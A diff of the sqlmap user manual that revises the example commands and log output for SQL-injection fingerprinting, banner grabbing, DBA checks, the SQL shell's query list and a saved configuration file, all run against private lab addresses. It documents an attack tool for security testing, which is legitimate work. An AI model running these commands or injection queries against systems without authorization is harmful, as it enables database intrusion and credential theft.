@@ -2207,11 +2207,13 @@ page content.</P>
 
 <P>By default the web application's back-end database management system
 fingerprint is performed requesting a database specific function which
-returns a known static value. By comparing this value with the returned
+returns a known static value. By comparing these value with the returned
 value it is possible to identify if the back-end database is effectively
-the one that sqlmap expected.</P>
+the one that sqlmap expected. Depending on the DBMS being tested, a
+SQL dialect syntax which is syntatically correct depending upon the
+back-end DBMS is also tested.</P>
 <P>After identifying an injectable vector, sqlmap fingerprints the back-end
-database management system and go ahead with the injection with their
+database management system and go ahead with the injection with its
 specific syntax within the limits of the database architecture.</P>
 
 <P>Example on a <B>MySQL 5.0.67</B> target:</P>
@@ -2221,17 +2223,12 @@ specific syntax within the limits of the database architecture.</P>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1
 
 [...]
-[hh:mm:14] [INFO] testing MySQL
-[hh:mm:14] [INFO] query: CONCAT(CHAR(51), CHAR(51))
-[hh:mm:14] [INFO] retrieved: 33
-[hh:mm:14] [INFO] performed 20 queries in 0 seconds
-[hh:mm:14] [INFO] confirming MySQL
-[hh:mm:14] [INFO] query: LENGTH(CHAR(51))
-[hh:mm:14] [INFO] retrieved: 1
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT 3 FROM information_schema.TABLES LIMIT 0, 1
-[hh:mm:14] [INFO] retrieved: 3
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
+[hh:mm:17] [INFO] testing MySQL
+[hh:mm:17] [INFO] confirming MySQL
+[hh:mm:17] [INFO] query: SELECT 5 FROM information_schema.TABLES LIMIT 0, 1
+[hh:mm:17] [INFO] retrieved: 5
+[hh:mm:17] [INFO] performed 13 queries in 0 seconds
+[hh:mm:17] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: MySQL >= 5.0.0
@@ -2253,27 +2250,22 @@ messages, you can  provide the <CODE>--fingerprint</CODE> option.</P>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -f
 
 [...]
-[hh:mm:14] [INFO] testing MySQL
-[hh:mm:14] [INFO] query: CONCAT(CHAR(52), CHAR(52))
-[hh:mm:14] [INFO] retrieved: 44
-[hh:mm:14] [INFO] performed 20 queries in 0 seconds
-[hh:mm:14] [INFO] confirming MySQL
-[hh:mm:14] [INFO] query: LENGTH(CHAR(52))
-[hh:mm:14] [INFO] retrieved: 1
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT 4 FROM information_schema.TABLES LIMIT 0, 1
-[hh:mm:14] [INFO] retrieved: 4
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-[hh:mm:14] [INFO] query: SELECT 4 FROM information_schema.PARAMETERS LIMIT 0, 1
-[hh:mm:14] [INFO] retrieved: 
-[hh:mm:14] [INFO] performed 6 queries in 0 seconds
-[hh:mm:14] [INFO] query: MID(@@plugin_dir, 1, 1)
-[hh:mm:14] [INFO] retrieved: 
-[hh:mm:14] [INFO] performed 6 queries in 0 seconds
-[hh:mm:14] [INFO] query: MID(@@hostname, 1, 1)
-[hh:mm:14] [INFO] retrieved: n
-[hh:mm:14] [INFO] performed 13 queries in 0 seconds
-[hh:mm:14] [INFO] executing MySQL comment injection fingerprint
+[hh:mm:49] [INFO] testing MySQL
+[hh:mm:49] [INFO] confirming MySQL
+[hh:mm:49] [INFO] query: SELECT 3 FROM information_schema.TABLES LIMIT 0, 1
+[hh:mm:49] [INFO] retrieved: 3
+[hh:mm:49] [INFO] performed 13 queries in 0 seconds
+[hh:mm:49] [INFO] the back-end DBMS is MySQL
+[hh:mm:49] [INFO] query: SELECT 3 FROM information_schema.PARAMETERS LIMIT 0, 1
+[hh:mm:49] [INFO] retrieved: 
+[hh:mm:49] [INFO] performed 6 queries in 0 seconds
+[hh:mm:49] [INFO] query: MID(@@table_open_cache, 1, 1)
+[hh:mm:49] [INFO] retrieved: 
+[hh:mm:49] [INFO] performed 6 queries in 0 seconds
+[hh:mm:49] [INFO] query: MID(@@hostname, 1, 1)
+[hh:mm:49] [INFO] retrieved: t
+[hh:mm:49] [INFO] performed 13 queries in 0 seconds
+[hh:mm:49] [INFO] executing MySQL comment injection fingerprint
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: active fingerprint: MySQL >= 5.0.38 and &lt; 5.1.2
@@ -2290,19 +2282,17 @@ back-end DBMS: active fingerprint: MySQL >= 5.0.38 and &lt; 5.1.2
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/oracle/get_int.php?id=1" -v 1 -f
 
 [...]
-[hh:mm:26] [WARNING] the back-end DMBS is not MySQL
-[hh:mm:26] [INFO] testing Oracle
-[hh:mm:26] [INFO] query: LENGTH(SYSDATE)
-[hh:mm:26] [INFO] retrieved: 9
-[hh:mm:26] [INFO] performed 13 queries in 0 seconds
-[hh:mm:26] [INFO] confirming Oracle
-[hh:mm:26] [INFO] query: SELECT VERSION FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1
-[hh:mm:26] [INFO] retrieved: 10.2.0.1.0
-[hh:mm:27] [INFO] performed 76 queries in 0 seconds
+[hh:mm:38] [WARNING] the back-end DMBS is not MySQL
+[hh:mm:38] [INFO] testing Oracle
+[hh:mm:38] [INFO] confirming Oracle
+[hh:mm:38] [INFO] the back-end DBMS is Oracle
+[hh:mm:38] [INFO] query: SELECT SUBSTR((VERSION), 1, 2) FROM SYS.PRODUCT_COMPONENT_VERSION WHERE ROWNUM=1
+[hh:mm:38] [INFO] retrieved: 10
+[hh:mm:38] [INFO] performed 20 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
-back-end DBMS:    active fingerprint: Oracle 10g
-                  html error message fingerprint: Oracle
+back-end DBMS: active fingerprint: Oracle 10g
+               html error message fingerprint: Oracle
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -2314,21 +2304,16 @@ back-end DBMS:    active fingerprint: Oracle 10g
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -v 1 -f
 
 [...]
-[hh:mm:48] [WARNING] the back-end DMBS is not Oracle
-[hh:mm:48] [INFO] testing PostgreSQL
-[hh:mm:48] [INFO] query: COALESCE(6, NULL)
-[hh:mm:48] [INFO] retrieved: 6
-[hh:mm:48] [INFO] performed 13 queries in 0 seconds
-[hh:mm:48] [INFO] confirming PostgreSQL
-[hh:mm:48] [INFO] query: LENGTH(CHR(54))
-[hh:mm:48] [INFO] retrieved: 1
-[hh:mm:48] [INFO] performed 13 queries in 0 seconds
-[hh:mm:48] [INFO] query: SUBSTR(TRANSACTION_TIMESTAMP()::text, 1, 1)
-[hh:mm:48] [INFO] retrieved: 2
-[hh:mm:48] [INFO] performed 13 queries in 0 seconds
-[hh:mm:48] [INFO] query: SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)
-[hh:mm:48] [INFO] retrieved: 
-[hh:mm:48] [INFO] performed 6 queries in 0 seconds
+[hh:mm:14] [WARNING] the back-end DMBS is not Oracle
+[hh:mm:14] [INFO] testing PostgreSQL
+[hh:mm:14] [INFO] confirming PostgreSQL
+[hh:mm:14] [INFO] the back-end DBMS is PostgreSQL
+[hh:mm:14] [INFO] query: SUBSTR(TRANSACTION_TIMESTAMP()::text, 1, 1)
+[hh:mm:14] [INFO] retrieved: 2
+[hh:mm:14] [INFO] performed 13 queries in 0 seconds
+[hh:mm:14] [INFO] query: SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)
+[hh:mm:14] [INFO] retrieved: 
+[hh:mm:14] [INFO] performed 6 queries in 0 seconds
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: active fingerprint: PostgreSQL >= 8.3.0
@@ -2350,12 +2335,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 
 [...]
 [hh:mm:41] [WARNING] the back-end DMBS is not PostgreSQL
 [hh:mm:41] [INFO] testing Microsoft SQL Server
-[hh:mm:41] [INFO] query: LTRIM(STR(LEN(7)))
-[hh:mm:41] [INFO] retrieved: 1
-[hh:mm:41] [INFO] performed 13 queries in 0 seconds
-[hh:mm:41] [INFO] query: SELECT SUBSTRING((@@VERSION), 25, 1)
-[hh:mm:41] [INFO] retrieved: 0
-[hh:mm:41] [INFO] performed 13 queries in 0 seconds
+[hh:mm:41] [INFO] confirming Microsoft SQL Server
+[hh:mm:41] [INFO] the back-end DBMS is Microsoft SQL Server
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS:  active fingerprint: Microsoft SQL Server 2000
@@ -2371,14 +2352,10 @@ back-end DBMS:  active fingerprint: Microsoft SQL Server 2000
 $ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f
 
 [...]
-[hh:mm:51] [WARNING] the back-end DMBS is not PostgreSQL
-[hh:mm:51] [INFO] testing Microsoft SQL Server
-[hh:mm:51] [INFO] query: LTRIM(STR(LEN(0)))
-[hh:mm:51] [INFO] retrieved: 1
-[hh:mm:51] [INFO] performed 13 queries in 0 seconds
-[hh:mm:51] [INFO] query: SELECT SUBSTRING((@@VERSION), 25, 1)
-[hh:mm:51] [INFO] retrieved: 5
-[hh:mm:51] [INFO] performed 13 queries in 0 seconds
+[hh:mm:41] [WARNING] the back-end DMBS is not PostgreSQL
+[hh:mm:41] [INFO] testing Microsoft SQL Server
+[hh:mm:41] [INFO] confirming Microsoft SQL Server
+[hh:mm:41] [INFO] the back-end DBMS is Microsoft SQL Server
 web server operating system: Windows 2003 or 2000
 web application technology: ASP.NET, Microsoft IIS 6.0, ASP
 back-end DBMS: active fingerprint: Microsoft SQL Server 2005
@@ -2397,30 +2374,25 @@ you can also provide the <CODE>-b</CODE> or <CODE>--banner</CODE> option.</P>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" -v 1 -f -b
 
 [...]
-[hh:mm:24] [INFO] testing MySQL
-[hh:mm:24] [INFO] query: CONCAT(CHAR(52), CHAR(52))
-[hh:mm:24] [INFO] retrieved: 44
-[hh:mm:24] [INFO] performed 20 queries in 0 seconds
-[hh:mm:24] [INFO] confirming MySQL
-[hh:mm:24] [INFO] query: LENGTH(CHAR(52))
-[hh:mm:24] [INFO] retrieved: 1
-[hh:mm:24] [INFO] performed 13 queries in 0 seconds
-[hh:mm:24] [INFO] query: SELECT 4 FROM information_schema.TABLES LIMIT 0, 1
-[hh:mm:24] [INFO] retrieved: 4
-[hh:mm:24] [INFO] performed 13 queries in 0 seconds
-[hh:mm:24] [INFO] query: VERSION()
-[hh:mm:24] [INFO] retrieved: 5.0.67-0ubuntu6
-[hh:mm:25] [INFO] performed 111 queries in 0 seconds
-[hh:mm:25] [INFO] query: SELECT 4 FROM information_schema.PARAMETERS LIMIT 0, 1
-[hh:mm:25] [INFO] retrieved: 
-[hh:mm:25] [INFO] performed 6 queries in 0 seconds
-[hh:mm:25] [INFO] query: MID(@@plugin_dir, 1, 1)
-[hh:mm:25] [INFO] retrieved: 
-[hh:mm:25] [INFO] performed 6 queries in 0 seconds
-[hh:mm:25] [INFO] query: MID(@@hostname, 1, 1)
-[hh:mm:25] [INFO] retrieved: n
-[hh:mm:25] [INFO] performed 13 queries in 0 seconds
-[hh:mm:25] [INFO] executing MySQL comment injection fingerprint
+[hh:mm:04] [INFO] testing MySQL
+[hh:mm:04] [INFO] confirming MySQL
+[hh:mm:04] [INFO] query: SELECT 0 FROM information_schema.TABLES LIMIT 0, 1
+[hh:mm:04] [INFO] retrieved: 0
+[hh:mm:04] [INFO] performed 13 queries in 0 seconds
+[hh:mm:04] [INFO] the back-end DBMS is MySQL
+[hh:mm:04] [INFO] query: VERSION()
+[hh:mm:04] [INFO] retrieved: 5.0.67-0ubuntu6
+[hh:mm:05] [INFO] performed 111 queries in 1 seconds
+[hh:mm:05] [INFO] query: SELECT 0 FROM information_schema.PARAMETERS LIMIT 0, 1
+[hh:mm:05] [INFO] retrieved: 
+[hh:mm:05] [INFO] performed 6 queries in 0 seconds
+[hh:mm:05] [INFO] query: MID(@@table_open_cache, 1, 1)
+[hh:mm:05] [INFO] retrieved: 
+[hh:mm:05] [INFO] performed 6 queries in 0 seconds
+[hh:mm:05] [INFO] query: MID(@@hostname, 1, 1)
+[hh:mm:05] [INFO] retrieved: t
+[hh:mm:06] [INFO] performed 13 queries in 0 seconds
+[hh:mm:06] [INFO] executing MySQL comment injection fingerprint
 web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
 web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
@@ -2445,11 +2417,8 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mssql/get_int.php?id=1" -v 1 
 [...]
 [hh:mm:03] [WARNING] the back-end DMBS is not PostgreSQL
 [hh:mm:03] [INFO] testing Microsoft SQL Server
-[hh:mm:03] [INFO] query: LTRIM(STR(LEN(3)))
-[hh:mm:03] [INFO] retrieved: 1
-[hh:mm:03] [INFO] performed 13 queries in 0 seconds
-[hh:mm:03] [INFO] query: SELECT SUBSTRING((@@VERSION), 25, 1)
-[hh:mm:03] [INFO] retrieved: 0
+[hh:mm:03] [INFO] confirming Microsoft SQL Server
+[hh:mm:03] [INFO] the back-end DBMS is Microsoft SQL Server
 [hh:mm:03] [INFO] performed 13 queries in 0 seconds
 [hh:mm:03] [INFO] query: @@VERSION
 [hh:mm:03] [INFO] retrieved: Microsoft SQL Server  2000 - 8.00.194 (Intel X86) 
@@ -2479,12 +2448,8 @@ $ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 
 [...]
 [hh:mm:03] [WARNING] the back-end DMBS is not PostgreSQL
 [hh:mm:03] [INFO] testing Microsoft SQL Server
-[hh:mm:03] [INFO] query: LTRIM(STR(LEN(8)))
-[hh:mm:03] [INFO] retrieved: 1
-[hh:mm:03] [INFO] performed 13 queries in 0 seconds
-[hh:mm:03] [INFO] query: SELECT SUBSTRING((@@VERSION), 25, 1)
-[hh:mm:03] [INFO] retrieved: 5
-[hh:mm:03] [INFO] performed 13 queries in 0 seconds
+[hh:mm:03] [INFO] confirming Microsoft SQL Server
+[hh:mm:03] [INFO] the back-end DBMS is Microsoft SQL Server
 [hh:mm:03] [INFO] query: @@VERSION
 [hh:mm:03] [INFO] retrieved: Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
         Oct 14 2005 00:33:37 
@@ -2648,13 +2613,12 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-
 [...]
 back-end DBMS: PostgreSQL
 
-[hh:mm:52] [INFO] testing if current user is DBA
-[hh:mm:52] [INFO] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
-usename=CURRENT_USER OFFSET 0 LIMIT 1)=CHR(116)||CHR(114)||CHR(117)||CHR(101)) THEN 1 
-ELSE 0 END)
-[hh:mm:52] [INFO] retrieved: 
-[hh:mm:52] [INFO] performed 6 queries in 0 seconds
-current user is DBA:    'False'
+[hh:mm:49] [INFO] testing if current user is DBA
+[hh:mm:49] [INFO] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
+usename=CURRENT_USER OFFSET 0 LIMIT 1)) THEN 1 ELSE 0 END)
+[hh:mm:49] [INFO] retrieved: 1
+[hh:mm:50] [INFO] performed 13 queries in 0 seconds
+current user is DBA:    'True'
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -3711,6 +3675,8 @@ SELECT usename, passwd FROM pg_shadow ORDER BY usename [3]:
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-shell -v 0
 
 sql> [TAB TAB]
+ LIMIT 
+(SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
 AND ORD(MID((%s), %d, 1)) > %d
 CAST(%s AS CHAR(10000))
 COUNT(%s)
@@ -3722,14 +3688,16 @@ LIMIT %d, %d
 MID((%s), %d, %d)
 ORDER BY %s ASC
 SELECT %s FROM %s.%s
-SELECT column_name, column_type FROM information_schema.COLUMNS WHERE table_name='%s' AND 
-table_schema='%s'
+SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)
+SELECT column_name, column_type FROM information_schema.COLUMNS WHERE table_name='%s' AND table_schema='%s'
 SELECT grantee FROM information_schema.USER_PRIVILEGES
 SELECT grantee, privilege_type FROM information_schema.USER_PRIVILEGES
 SELECT schema_name FROM information_schema.SCHEMATA
 SELECT table_schema, table_name FROM information_schema.TABLES
 SELECT user, password FROM mysql.user
+SLEEP(%d)
 VERSION()
+\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)
 sql> SE[TAB]
 sql> SELECT
 </PRE>
@@ -3776,7 +3744,7 @@ table_schema=CHAR(116,101,115,116) LIMIT 2, 1
 [hh:mm:48] [INFO] retrieved: surname
 [hh:mm:48] [INFO] performed 55 queries in 0 seconds
 [hh:mm:48] [INFO] the query with column names is: SELECT id, name, surname FROM test.users
-[hh:mm:48] [INPUT] does the SQL query that you provide might return multiple entries? [Y/n] y
+[hh:mm:48] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
 [hh:mm:04] [INFO] query: SELECT IFNULL(CAST(COUNT(id) AS CHAR(10000)), CHAR(32)) FROM test.users
 [hh:mm:04] [INFO] retrieved: 5
 [hh:mm:04] [INFO] performed 13 queries in 0 seconds
@@ -4218,78 +4186,81 @@ INI file, <CODE>sqlmap-SAUbs.conf</CODE>.</P>
 $ cat sqlmap-SAUbs.conf
 
 [Target]
-googleDork = 
-list = 
 url = http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1
+googledork = 
+list = 
 
 [Request]
-aCred = 
-aType = 
+threads = 1
+useragentsfile = 
+atype = 
 agent = 
-cookie = 
-data = 
 delay = 0
 headers = 
-method = GET
+cookie = 
 proxy = 
+timeout = 10
+acred = 
 referer = 
-threads = 1
-timeout = None
-userAgentsFile = 
+data = 
+method = GET
 
 [Miscellaneous]
-batch = False
+updateall = False
 eta = False
-sessionFile = 
-updateAll = False
-verbose = 1
+verbose = 2
+batch = False
+sessionfile = 
 
 [Enumeration]
-col = 
+dumpall = False
+limitstop = 0
+getusers = False
+isdba = False
+getpasswordhashes = False
+excludesysdbs = False
+getcurrentdb = False
+gettables = False
+dumptable = False
 db = 
-dumpAll = False
-dumpTable = False
-excludeSysDbs = False
-getBanner = True
-getColumns = False
-getCurrentDb = False
-getCurrentUser = False
-getDbs = False
-getPasswordHashes = False
-getPrivileges = False
-getTables = False
-getUsers = False
-limitStart = 0
-limitStop = 0
-query = 
-sqlShell = False
+limitstart = 0
+getprivileges = False
+sqlshell = False
 tbl = 
+getcolumns = False
+query = 
+getdbs = False
 user = 
+col = 
+getcurrentuser = False
+getbanner = True
 
 [File system]
-rFile = 
-wFile = 
+wfile = 
+rfile = 
 
 [Takeover]
-osShell = False
+osshell = False
 
 [Fingerprint]
-extensiveFp = False
+extensivefp = False
 
 [Injection]
+estring = 
 dbms = 
-eRegexp = 
-eString = 
+string = 
 postfix = 
 prefix = 
+testparameter = 
 regexp = 
-string = 
-testParameter = 
+eregexp = 
 
 [Techniques]
-timeTest = False
-unionTest = False
-unionUse = False
+stackedtest = False
+utech = 
+unionuse = False
+timetest = False
+uniontest = False
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -4303,7 +4274,6 @@ with the <CODE>-c</CODE> option as explained above in section 5.2:</P>
 $ python sqlmap.py -c "sqlmap-SAUbs.conf"
 
 [...]
-
 [hh:mm:16] [INFO] performed 657 queries in 6 seconds
 
 banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
